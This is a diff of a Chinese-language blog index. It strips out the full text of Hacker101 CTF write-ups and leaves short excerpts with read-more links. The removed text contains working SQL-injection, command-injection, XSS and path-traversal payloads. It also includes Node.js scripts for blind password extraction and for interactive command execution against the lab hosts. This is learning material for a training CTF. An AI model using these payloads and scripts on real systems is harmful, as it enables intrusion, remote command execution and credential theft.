-<p>後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的<br>
-此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAG
-<code>fetch?id=123123 union all select &quot;main.py&quot;</code>
-<img src="/images/ctf/part4-photo-2-03.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題<br>
-<code>subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1]</code><br>
-只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了<br>
-但要觸發他必須要靠 photos table 裡面的 filename 去觸發<br>
-一開始嘗試使用 stacked query 的方式，以下為 payload<br>
-<code>541; UPDATE photos SET filename = '; ls ' WHERE id = 3;</code></p>
-<p>試了很久完全沒有任何反應，本來以為不是 stacked query 這條路<br>
-結果回去翻題目的提示有提到 COMMIT 這個關鍵字<br>
-才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效<br>
-而是要下 <code>COMMIT;</code> UPDATE 的語法才會真正觸發<br>
-於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了<br>
-<code>fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT;</code>
-<img src="/images/ctf/part4-photo-3-01.png" alt></p>
-<p>然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inputFunction</span>(<span class="params">readline</span>) </span>&#123;</span><br><span class="line">    readline.question(<span class="string">`Keep input\n\n`</span>, <span class="keyword">async</span> (command) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line">        <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/fetch'</span>,</span><br><span class="line">            params: &#123;</span><br><span class="line">                id: <span class="string">`541; UPDATE photos SET filename = '; <span class="subst">$&#123;command&#125;</span> | tr "\\n" ";" ' WHERE id = 3; COMMIT;`</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/'</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'\n'</span> + result.split(<span class="string">'Space used: '</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/i&gt;&lt;/div&gt;'</span>)[<span class="number">0</span>].replace(<span class="regexp">/;/g</span>, <span class="string">"\n"</span>));  </span><br><span class="line">        inputFunction(readline)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>).createInterface(&#123;</span><br><span class="line">        input: process.stdin,</span><br><span class="line">        output: process.stdout</span><br><span class="line">    &#125;)</span><br><span class="line">    inputFunction(readline)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
-<p>但是逛了老半天 ... 完全不知道 flag 放在哪裡<br>
-跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境<br>
-最後下一個 <code>printenv</code> 就拿到 FLAG 了 ！
-<img src="/images/ctf/part4-photo-3-02.png" alt></p>
-<p>簡單 demo 影片<br>
-<img src="/images/ctf/part4-photo-demo.gif" alt></p>
-<h1><span id="後記">後記</span></h1>
-<p>這題蠻有趣的，學到 stacked query、command injection 以及 LFI
-不過過程中有些真的不知道怎麼做，跑去看提示才知道<br>
-不然真的瞎子摸象摸不太出來 QQ</p>
-
+            <h1 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h1>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/10/hacker101-part4/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -533,54 +325,17 @@ include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
             
         </h1>
         <div class="content">
-            <p>系列篇第三篇，目前題目寫下來都蠻有趣的</p>
-<p>&lt;!-- more --&gt;</p>
-<h1><span id="ticketastic-live-instance">Ticketastic: Live Instance</span></h1>
-<p>根據題目總共有 2 個 Flag</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一進來發現有兩個同樣名稱的題目，這邊先點上面的 DEMO 進去看看<br>
-<img src="/images/ctf/part3-instance-1-01.png" alt></p>
-<p>大概就是介紹，但最後發現一句特別的話『會有機器人來讀這些 ticket』<br>
-不太明白這意思，先放著一邊繼續看看有什麼功能，裡面提到用 admin/admin 可以先登入<br>
-<img src="/images/ctf/part3-instance-1-02.png" alt></p>
-<p>登入後可以看到有一個 ticket 以及可以新建使用者<br>
-<img src="/images/ctf/part3-instance-1-03.png" alt></p>
-<p>點了 ticket 進去看了一下，提到說，如果處理錯誤的話會在這邊被標記起來<br>
-看起來是使用者提供錯誤的連結的話，當機器人處理不了時會在這邊顯示提醒<br>
-但這邊看起來沒什麼洞可以挖，繼續往下<br>
-<img src="/images/ctf/part3-instance-1-04.png" alt></p>
-<p>嘗試去建立使用者，發現可以建立成功<br>
-<img src="/images/ctf/part3-instance-1-05.png" alt></p>
-<p>另外還發現建立方式是用 GET 去建立<br>
-這就有點微妙了，一般來說，像是使用 LINE 等等通訊軟體<br>
-貼連結上去，都會預設去做 GET，然後把預覽顯示出來<br>
-這邊也有可能走這種方式</p>
-<p>這邊建立一個 ticket 嘗試看能不能用 GET 連結的方式去建立使用者<br>
-但卻發現連結處理錯誤!?<br>
-<img src="/images/ctf/part3-instance-1-06.png" alt>
-<img src="/images/ctf/part3-instance-1-07.png" alt></p>
-<p>試著換另一個連結，依舊錯誤
-<img src="/images/ctf/part3-instance-1-08.png" alt></p>
-<p>想了非常久才想到，這應該是 SSRF 的一種利用<br>
-於是把 payload 改成 localhost 的方式去探測能不能用內網方式新增使用者<br>
-發現不再顯示錯誤連結！<br>
-<img src="/images/ctf/part3-instance-1-10.png" alt>
-<img src="/images/ctf/part3-instance-1-11.png" alt></p>
-<p>建立的使用者也能正確地登入！<br>
-<img src="/images/ctf/part3-instance-1-12.png" alt></p>
-<p>接著就把這個 Payload 帶到另一個題目，發現能夠登入！<br>
-登入後發現第一個 FLAG<br>
-<img src="/images/ctf/part3-instance-1-13.png" alt>
-<img src="/images/ctf/part3-instance-1-14.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>接下來發現連結上面有 id<br>
-試著帶入單引號發現噴出 SQL Exception<br>
-<img src="/images/ctf/part3-instance-2-01.png" alt></p>
-<p>丟入 sqlmap dump 出 admin 的密碼就是 FLAG 了
-<img src="/images/ctf/part3-instance-2-02.png" alt></p>
-
+            <p>系列篇第三篇，目前題目寫下來都蠻有趣的  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/08/hacker101-part3/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -624,95 +379,17 @@ include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
             
         </h1>
         <div class="content">
-            <p>系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ</p>
-<p>&lt;!-- more --&gt;</p>
-<h1><span id="micro-cms-v1">Micro-CMS v1</span></h1>
-<p>根據題目總共有 4 個 Flag</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>打開頁面後頁面是
-<img src="/images/ctf/part2-cms-v1-1-01.png" alt></p>
-<p>試著建立 post 試試看
-<img src="/images/ctf/part2-cms-v1-1-02.png" alt></p>
-<p>發現有 XSS 跳出來，但打開原始碼沒發現什麼變化
-<img src="/images/ctf/part2-cms-v1-1-03.png" alt></p>
-<p>按了 Go Home 會去上一頁就跳出 FLAG 了
-<img src="/images/ctf/part2-cms-v1-1-04.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>因為跳出 xss 的時候注意到 page 後面的 id 帶的是 8<br>
-覺得很疑惑，因為總共才三筆資料，id 怎麼會是 8?<br>
-<img src="/images/ctf/part2-cms-v1-2-01.png" alt></p>
-<p>於是就 8 7 6 回去一個一個看看是不是有什麼玄機<br>
-發現 id 是 6 的時候，出現了 forbidden 的字樣，寫著不可讀<br>
-<img src="/images/ctf/part2-cms-v1-2-02.png" alt></p>
-<p>竟然不可讀的話，試著加上 edit 發現可以編輯，且內容有 FLAG
-<img src="/images/ctf/part2-cms-v1-2-03.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>接下來就試著對每一個頁面的 id 做 SQL Injection<br>
-發現在 edit 的頁面狀況下，id 會有 SQL Injection<br>
-於是就跳出 FLAG 了<br>
-<img src="/images/ctf/part2-cms-v1-3-01.png" alt></p>
-<h2><span id="0x03">0x03</span></h2>
-<p>這個漏洞我找非常非常的久<br>
-才發現原來的 <code>&lt;svg/onload=alert('xss')</code> payload 是跳不出 FLAG 的<br>
-要用 <code>&lt;img src=&quot;&quot; onerror=&quot;javascript:alert('xss')&quot;/&gt;</code> 才跳得出來<br>
-<img src="/images/ctf/part2-cms-v1-4-01.png" alt>
-<img src="/images/ctf/part2-cms-v1-4-02.png" alt></p>
-<p>打開原始碼發現 FLAG 就藏在下面<br>
-第一張是 <code>img</code> tag 的原始碼<br>
-第二張是 <code>svg</code> tag 的原始碼<br>
-兩個都可以觸發 xss，但只有 <code>img</code> 有 FLAG<br>
-不知道為何 <code>svg</code> 那一個 payload 不能觸發<br>
-可能是這題的解答，有希望某一些固定的 tag 去寫<br>
-才會造成 <code>svg</code> payload 跳不出 FLAG<br>
-<img src="/images/ctf/part2-cms-v1-4-03.png" alt>
-<img src="/images/ctf/part2-cms-v1-4-04.png" alt></p>
-<h1><span id="petshop-pro">Petshop Pro</span></h1>
-<p>根據題目總共有 3 個 Flag</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>進去之後頁面長這樣
-<img src="/images/ctf/part2-pet-0-01.png" alt></p>
-<p>按下 Add to Cart 之後
-<img src="/images/ctf/part2-pet-0-02.png" alt></p>
-<p>在按下 checkout
-<img src="/images/ctf/part2-pet-0-03.png" alt></p>
-<p>看來是一個結帳流程，講到錢就想來試試看能不能 0 元結帳<br>
-看了一下 source code 發現有一個 hidden input
-<img src="/images/ctf/part2-pet-0-04.png" alt></p>
-<p>並且用 javascript 把價格更改成 0 元後送出
-<img src="/images/ctf/part2-pet-0-05.png" alt></p>
-<p>送出後價格為 0 元且拿到 FLAG
-<img src="/images/ctf/part2-pet-0-06.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>透過 nmap 找到登入點為 <code>/login</code> 之後<br>
-<img src="/images/ctf/part2-pet-1-01.png" alt></p>
-<p>稍微試著輸入單引號看看會不會有 SQL Injection 問題，結果沒有 QQ<br>
-但因為輸入 username 的時候，輸入錯誤會爆出 <strong>Invalid username</strong><br>
-<img src="/images/ctf/part2-pet-1-02.png" alt>
-代表說此系統設計方式，如果輸入正確的 username 的話，應該不會爆出這個錯誤<br>
-根據以上邏輯先寫出第一版程式找找看 username<br>
-<script src="//gist.github.com/e49a273bd60048ffbcd0ddf99c4f5196.js?file=brute_username.js"></script></p>
-<p>找到 username 後輸入，的確變成 <strong>Invalid password</strong><br>
-那就繼續找密碼
-<img src="/images/ctf/part2-pet-1-04.png" alt>
-<img src="/images/ctf/part2-pet-1-03.png" alt></p>
-<p>接下來用一樣的方式找到密碼
-<img src="/images/ctf/part2-pet-1-05.png" alt>
-<script src="//gist.github.com/ec81363f36c5d82438d5388e95266bb7.js?file=brute_password.js"></script></p>
-<p>登入成功，出現 FLAG!
-<img src="/images/ctf/part2-pet-1-06.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>登入後發現可以編輯商品
-<img src="/images/ctf/part2-pet-2-01.png" alt>
-<img src="/images/ctf/part2-pet-2-02.png" alt></p>
-<p>試著輸入 xss payload，跳出 xss，但打開原始碼沒發現任何東西
-<img src="/images/ctf/part2-pet-2-03.png" alt></p>
-<p>試著加入購物車發現，也會跳出 xss
-<img src="/images/ctf/part2-pet-2-04.png" alt></p>
-<p>打開原始碼發現 FLAG!
-<img src="/images/ctf/part2-pet-2-05.png" alt></p>
-
+            <p>系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/06/hacker101-part2/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -756,140 +433,17 @@ include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
             
         </h1>
         <div class="content">
-            <p>近期想到 HackerOne 找找 Bug Bounty<br>
-卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄</p>
-<p>&lt;!-- more --&gt;</p>
-<h1><span id="micro-cms-v2">Micro-CMS v2</span></h1>
-<p>根據題目總共有 3 個 Flag</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一進來頁面長這樣
-<img src="/images/ctf/part1-cms-v2-1-01.png" alt></p>
-<p>試著建立一個新的 Page, 發現要登入帳號密碼
-<img src="/images/ctf/part1-cms-v2-1-02.png" alt></p>
-<p>看到帳號密碼就是要先下個單引號，結果就噴出 exception 了
-<img src="/images/ctf/part1-cms-v2-1-03.png" alt></p>
-<p>根據 error 的 sql<br>
-<code>cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')</code>
-可以推斷出他是透過 username select 出來後再用程式比對密碼<br>
-有 SQL Injectiob 的話，就可以走 union all select 的套路
-username: <code>'union all select 1#</code>
-password: <code>1</code>
-<img src="/images/ctf/part1-cms-v2-1-04.png" alt></p>
-<blockquote>
-<p>補充:<br>
-<code>union all select</code> 可以組合前一個和後一個 SQL 結果
-假設 <code>select username from admins where uername = 'admin'</code> 會回傳 <code>admin</code>
-但如果是 <code>select username from admins where uername = 'not_exists'</code> 會回傳空的東西
-配合 <code>union all select</code> 的話
-<code>select username from admins where uername = 'admin' union all select 1</code> 會回傳 <code>admin</code>, <code>1</code> 兩個值<br>
-那如果是 <code>select username from admins where uername = 'not_exists' union all select 1</code> 只會回傳 <code>1</code></p>
-</blockquote>
-<p>登入成功後，可以看到有一個 Private Page
-<img src="/images/ctf/part1-cms-v2-1-05.png" alt></p>
-<p>點進去後發現第一個 FLAG
-<img src="/images/ctf/part1-cms-v2-1-06.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>接下來嘗試新建立 Page
-<img src="/images/ctf/part1-cms-v2-2-01.png" alt></p>
-<p>接下來就試著輸入 <code>&lt;svg/onload=alert(document.cookie)</code>，建立成功
-<img src="/images/ctf/part1-cms-v2-2-02.png" alt></p>
-<p>發現好像也沒跳出什麼東西，嘗試去玩玩修改功能
-發現到第二次修改成功的時候會出現 Not Found URL，覺得有點疑惑
-<img src="/images/ctf/part1-cms-v2-2-03.png" alt></p>
-<p>於是把 Payload 記下來拿到 Post Man 重新送送看，結果就拿到 FLAG 了
-<img src="/images/ctf/part1-cms-v2-2-04.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>這個漏洞找有點久，因為登入的時候，過幾秒會被導入到首頁，不會被停留在登入成功的頁面<br>
-為了不讓 js 執行，所以改用 Post Man 去送，想看一下回來的 html 是什麼<br>
-發現回來的 html 註解裡面有一個小提示
-<img src="/images/ctf/part1-cms-v2-3-01.png" alt></p>
-<p>看起來是要往拿到真正的帳號密碼才會拿到 FLAG
-於是把資料丟到 sqlmap 就把資料 dump 出來的
-<img src="/images/ctf/part1-cms-v2-3-02.png" alt></p>
-<p>登入成功後就拿到 FLAG 了</p>
-<p>這邊用另一個不用 sqlmap 而是改用自己寫程式去做 (雖然 sqlmap 原理應該跟這個差不多)<br>
-主要會用到 <code>length(password)</code> 和 <code>length(username)</code> 的方式先去判斷有幾個字元<br>
-再透過 mysql <code>_</code> 的匹配符號去做猜測，這個符號會去做一個比對<br>
-假設字串是 username = abcde，username like 'a____' 就會比對成功，會回傳 true<br>
-但如果是 username like 'b____' 就會比對失敗，會回傳 false<br>
-接下來會利用這個特性去撰寫一個程式去找到完整的帳號密碼</p>
-<p>假如說 <code>length(password) = 5</code><br>
-在 mysql 裡面可以這樣去寫 <code>select username from admins where username = '' or password like '_____'</code><br>
-然後在慢慢替換第一字 <code>select username from admins where username = '' or password like 'a____'</code> 去找到回傳 true 的狀況</p>
-<p>先嘗試去找到密碼的長度，一般輸入結果如果為 false 會回傳 <code>Uknown User</code>
-<img src="/images/ctf/part1-cms-v2-3-03.png" alt></p>
-<p>試著把 payload 改成 <code>' or 1=1#</code> 發現回傳<em>Invalid Password</em>，代表說有找到使用者<br>
-因為 false || true 的結果為 true，所以有成功從資料庫撈到資料<br>
-<img src="/images/ctf/part1-cms-v2-3-04.png" alt></p>
-<p>那是試著改成 <code>' or 1=221#</code> 發現回傳 <em>Uknown User</em>
-<img src="/images/ctf/part1-cms-v2-3-05.png" alt></p>
-<p>所以只要讓 username 那一段 sql 回傳 true，他就會把真正的密碼帶上來<br>
-所以接下來可以試著用 <code>' or length(password)=1#</code> 慢慢去比對看長度<br>
-最後發現密碼長度為 8</p>
-<p>接下來要構造出 like 的 payload 為 <code>' or password like binary '________'#</code><br>
-如果上面成立的話，會回傳 <em>Invalid Password</em> 失敗的話則會回傳 <em>Uknown User</em><br>
-根據這兩個結果可以撰寫程式了，這邊會用 node.js 去做列舉<br>
-這邊加上 binary 去強制去使用 CASE SENSITIVE 去做判別<br>
-密碼為: marcelle<br>
-<img src="/images/ctf/part1-cms-v2-3-06.png" alt></p>
-<p>所以最後 username: <code>' or 1=1#</code> password: <code>marcelle</code><br>
-登入後拿到 FLAG!<br>
-<img src="/images/ctf/part1-cms-v2-3-07.png" alt></p>
-<p>這邊附上程式
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">let</span> password = <span class="function">(<span class="params">(</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> temp = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span> (counter &lt; passwordLength) &#123;</span><br><span class="line">            temp += <span class="string">'_'</span>;</span><br><span class="line">            counter++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp</span><br><span class="line">    &#125;)();</span><br><span class="line">    <span class="keyword">let</span> found = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">let</span> answer = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">let</span> position = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> allPosibile = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        <span class="keyword">let</span> tempPassword = password</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> char <span class="keyword">of</span> allPosibile) &#123;</span><br><span class="line">            tempPassword = tempPassword.split(<span class="string">""</span>);</span><br><span class="line">            tempPassword[position] = char;</span><br><span class="line">            tempPassword = tempPassword.join(<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">let</span> payload = <span class="string">`' or password like binary '<span class="subst">$&#123;tempPassword&#125;</span>'#`</span></span><br><span class="line">            <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">                url: <span class="string">'http://34.74.105.127/58b04db906/login'</span>,</span><br><span class="line">                method: <span class="string">'post'</span>,</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    <span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">                &#125;,</span><br><span class="line">                data: qs.stringify(&#123;</span><br><span class="line">                    username: payload,</span><br><span class="line">                    password: <span class="string">''</span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">            <span class="keyword">if</span> (result.includes(<span class="string">'Invalid password'</span>)) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;position&#125;</span>: <span class="subst">$&#123;char&#125;</span>`</span>);</span><br><span class="line">                answer += char;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        position++;</span><br><span class="line">        <span class="keyword">if</span> (position &gt;= passwordLength) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(answer);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
-<h1><span id="tempimage">TempImage</span></h1>
-<p>根據題目總共有 2 個 Flag</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>剛進來頁面是這樣
-<img src="/images/ctf/part1-temp-1-01.png" alt></p>
-<p>點進去 upload.php 的頁面，發現可以上傳檔案<br>
-<img src="/images/ctf/part1-temp-1-02.png" alt></p>
-<p>順便開原始碼有哪些 input<br>
-<img src="/images/ctf/part1-temp-1-03.png" alt></p>
-<p>發現有 <code>file</code> 以及 <code>filename</code> 可以做更動，這邊先試著上傳一張正常的圖片
-URL: <code>http://34.74.105.127/020fb13cda/files/eb705c0e32ff0f15c9801f5d40fe290f_test-3.png</code>
-看起來是把我上傳的檔名變成檔案名稱了，這邊就試著改 filename (這邊使用 burp suit 去改，順便方便等等可以改內容)
-把 filename 改成 test-3.html 結尾
-<img src="/images/ctf/part1-temp-1-04.png" alt></p>
-<p>發現成功改成 .html 且成功是內容
-URL: <code>http://34.74.105.127/020fb13cda/files/807fb7eecbe831518d078107d8f0fedf_test-3.html</code>
-<img src="/images/ctf/part1-temp-1-05.png" alt></p>
-<p>這邊嘗試加上 ../ 在 filenmame 上面，發現爆出 FLAG 了
-<img src="/images/ctf/part1-temp-1-06.png" alt>
-<img src="/images/ctf/part1-temp-1-07.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>從上一個 FLAG 發現有一個 move_upload_file 裡面會帶一個 path
-<img src="/images/ctf/part1-temp-1-07.png" alt></p>
-<p>這邊試著符合這個 path 帶入 <code>/../test-3.html</code> 試試看
-<img src="/images/ctf/part1-temp-2-01.png" alt></p>
-<p>發現 URL 變成 <code>http://34.74.105.127/020fb13cda/files/test-3.html</code>
-往上跳了一層 ... !?<br>
-因為此 server 可以執行 php，於是改成 php 試試看
-順便在檔案內容之中多加一個 <code>&lt;?php phpinfo(); ?&gt;</code>
-<img src="/images/ctf/part1-temp-2-02.png" alt></p>
-<p>發現內容還是顯示圖片格式?
-<img src="/images/ctf/part1-temp-2-03.png" alt></p>
-<p>這邊試著把檔案內容全砍掉只留下 <code>&lt;?php phpinfo(); ?&gt;</code>
-<img src="/images/ctf/part1-temp-2-04.png" alt></p>
-<p>結果被判定成不是 PNG 不能上傳了
-<img src="/images/ctf/part1-temp-2-05.png" alt></p>
-<p>如果不是改檔案副檔名和 Content-Type 會影響格式判斷的話<br>
-有可能是根據 PNG 的前幾個 bytes 去判斷，所以這邊只留下前面的 bytes<br>
-<img src="/images/ctf/part1-temp-2-06.png" alt></p>
-<p>發現無法顯示 QQ，這邊不確定原因，試了非常久
-<img src="/images/ctf/part1-temp-2-07.png" alt></p>
-<p>後來想到在上傳到上一層不知道會怎樣，於是試試看
-<img src="/images/ctf/part1-temp-2-08.png" alt></p>
-<p>發現成功執行 PHP 檔案！！所以代表可能是 files 那一層有鎖不能顯示 php 檔案
-URL: <code>http://34.74.105.127/020fb13cda/test-3.php</code>
-<img src="/images/ctf/part1-temp-2-09.png" alt></p>
-<p>接下來上傳 web shell 去看看有什麼檔案
-<img src="/images/ctf/part1-temp-2-10.png" alt></p>
-<p>逛了一下，發現 index.php 有 FLAG 存在
-<img src="/images/ctf/part1-temp-2-11.png" alt></p>
-
+            <p>近期想到 HackerOne 找找 Bug Bounty<br>卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄</p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/04/hacker101-part1/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
